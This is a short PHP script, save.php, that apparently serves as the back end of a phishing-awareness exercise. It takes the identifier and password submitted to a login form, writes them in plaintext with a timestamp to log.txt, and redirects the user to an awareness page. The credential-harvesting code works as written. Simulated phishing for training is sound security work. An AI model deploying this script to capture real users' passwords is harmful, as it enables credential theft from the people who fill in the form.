<?php
// save.php - logs credentials and redirects to phished.html

$logFile = 'log.txt';
$timestamp = date('Y-m-d H:i:s');
$identifier = $_POST['identifier'] ?? '';
$password = $_POST['password'] ?? '';
$type = $_POST['type'] ?? 'unknown';

$entry = "[$timestamp] Type: $type, Identifier: $identifier, Password: $password" . PHP_EOL;

// Append to log file
file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);

// Redirect to the awareness page
header('Location: phished.html');
exit;
?>